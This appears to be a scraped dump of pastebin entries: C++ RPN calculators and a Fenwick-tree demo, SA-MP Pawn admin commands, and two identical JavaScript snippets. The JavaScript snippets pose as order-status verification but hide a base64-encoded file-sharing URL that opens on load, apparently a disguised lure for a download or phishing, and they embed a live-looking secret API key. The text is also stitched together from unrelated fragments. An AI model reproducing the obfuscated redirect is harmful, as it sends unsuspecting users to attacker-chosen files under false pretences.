    evaluateRPN(""1 2 &"");   // Неизвестный оператор
}

int main() {
    testStack();
    testCalculator();

    // Интерактивный режим
    std::cout << ""\n=== Interactive RPN Calculator ===\n"";
    std::cout << ""Enter expression (e.g. '3 4 + 2 *'), 'q' to quit\n"";

    char input[256];
    while (true) {
        std::cout << ""> "";
        std::cin.getline(input, sizeof(input));

        if (input[0] == 'q') break;

        double result = evaluateRPN(input);
        std::cout << ""= "" << result << ""\n"";
    }

    return 0;
}"
1BiTbEjL,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:05:41 AM CDT,"//chatgpt

#include <iostream>
#include <string>

template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& value, Node* nextNode = nullptr)
            : data(value), next(nextNode) {}
    };

    Node* topNode;

public:
    Stack() : topNode(nullptr) {}

    ~Stack() {
        while (!isEmpty()) {
            pop();
        }
    }

    void push(const T& value) {
        topNode = new Node(value, topNode);
    }

    void pop() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty, cannot pop.\n"";
            return;
        }
        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
    }

    T& top() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty.\n"";
            std::exit(1);
        }
        return topNode->data;
    }

    bool isEmpty() const {
        return topNode == nullptr;
    }
};

// Простейшая проверка: является ли строка числом (включая отрицательные)
bool isNumber(const std::string& s) {
    if (s.empty()) return false;
    size_t start = 0;
    if (s[0] == '-') {
        if (s.size() == 1) return false;
        start = 1;
    }
    for (size_t i = start; i < s.size(); ++i) {
        if (s[i] < '0' || s[i] > '9') return false;
    }
    return true;
}

// Простейший stoi, без std::stoi
int toInt(const std::string& s) {
    int result = 0;
    bool negative = false;
    size_t i = 0;

    if (s[0] == '-') {
        negative = true;
        i = 1;
    }

    for (; i < s.size(); ++i) {
        result = result * 10 + (s[i] - '0');
    }

    return negative ? -result : result;
}

void evaluateRPN(const std::string& input) {
    Stack<int> stack;
    std::string token = """";

    for (size_t i = 0; i <= input.length(); ++i) {
        char ch = (i < input.length()) ? input[i] : ' ';

        if (ch != ' ') {
            token += ch;
        } else if (!token.empty()) {
            if (isNumber(token)) {
                stack.push(toInt(token));
            } else if (token == ""+"" || token == ""-"" || token == ""*"" || token == ""/"") {
                if (stack.isEmpty()) { std::cerr << ""Not enough operands\n""; return; }
                int b = stack.top(); stack.pop();

                if (stack.isEmpty()) { std::cerr << ""Not enough operands\n""; return; }
                int a = stack.top(); stack.pop();

                if (token == ""+"") stack.push(a + b);
                else if (token == ""-"") stack.push(a - b);
                else if (token == ""*"") stack.push(a * b);
                else if (token == ""/"") stack.push(a / b); // Без проверки деления на 0 для простоты
            } else {
                std::cerr << ""Unknown token: "" << token << ""\n"";
                return;
            }
            token = """";
        }
    }

    if (!stack.isEmpty()) {
        std::cout << ""Result: "" << stack.top() << ""\n"";
    } else {
        std::cerr << ""No result on stack\n"";
    }
}

int main() {
    std::string input;
    std::cout << ""Enter RPN expression (e.g. '3 4 + 2 *'): "";
    std::getline(std::cin, input);

    evaluateRPN(input);

    return 0;
}
"
QfBWJEvz,Binary_Index_Tree,Araf_12,C++,Thursday 17th of April 2025 07:05:12 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int MAXINDEX = 100005;
int tree[MAXINDEX]; // BIT array

// Point update for BIT (add val to index idx)
void update(int idx, int val) {
    while (idx < MAXINDEX) {
        tree[idx] += val;
        idx += (idx & -idx);
    }
}

// Range update: add val to range [l, r]
void range_update(int l, int r, int val) {
    update(l, val);       // Add val at start
    update(r + 1, -val);  // Remove val after end
}

// Point query: get value at index idx
int point_query(int idx) {
    int res = 0;
    while (idx > 0) {
        res += tree[idx];
        idx -= (idx & -idx);
    }
    return res;
}

// Example usage
int main() {
    // Range updates
    range_update(2, 5, 10);  // add 10 to all elements in [2, 5]
    range_update(4, 7, 5);   // add 5 to all elements in [4, 7]

    // Point queries
    cout << ""Value at index 3: "" << point_query(3) << endl;  // should print 10
    cout << ""Value at index 5: "" << point_query(5) << endl;  // should print 15
    cout << ""Value at index 7: "" << point_query(7) << endl;  // should print 5
    cout << ""Value at index 1: "" << point_query(1) << endl;  // should print 0

    return 0;
}
"
xzwD0TAg,Market.js,dentira,JavaScript,Thursday 17th of April 2025 07:01:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rT63GkGT,Untitled,dentira,JavaScript,Thursday 17th of April 2025 06:46:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37583/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1mQj8UcB,Skin changer for Stars And Stripes Multtiplayer.,Joey_Simmons,Pawn,Thursday 17th of April 2025 06:41:38 AM CDT,"#include <a_samp>
#include <zcmd>
#include <sscanf2>

CMD:skin(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new skinid;
    if(sscanf(params, ""i"", skinid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /skin [skin_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 11754-12799, 13891-14257"");
        return 1;
    }

    new bool:isValid = (skinid >= 11754 && skinid <= 12799) || (skinid >= 13891 && skinid <= 14257);
    switch(isValid)
    {
        case true:
        {
            SetPlayerSkin(playerid, skinid);
            new string[128];
            format(string, sizeof(string), ""You have changed your skin to ID %d."", skinid);
            SendClientMessage(playerid, 0x00FF00FF, string);
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid skin ID! Valid IDs: 11754-12799, 13891-14257"");
        }
    }

    return 1;
}"
xhT9YYt2,Weapons in Stars And Stripes Multiplayer.,Joey_Simmons,Pawn,Thursday 17th of April 2025 06:33:56 AM CDT,"#include <a_samp>
#include <sscanf2>
#include <zcmd>

CMD:weapon(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new weaponid;
    if(sscanf(params, ""i"", weaponid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /weapon [weapon_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 70-92, 99-175"");
        return 1;
    }

    new bool:isValid = (weaponid >= 70 && weaponid <= 92) || (weaponid >= 99 && weaponid <= 175);
    switch(isValid)
    {
        case true:
        {
            GivePlayerWeapon(playerid, weaponid, 100);
            new string[128];
            format(string, sizeof(string), ""You have received weapon ID %d."", weaponid);
            SendClientMessage(playerid, 0x00FF00FF, string);
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid weapon ID! Valid IDs: 70-92, 99-175"");
        }
    }

    return 1;
}"
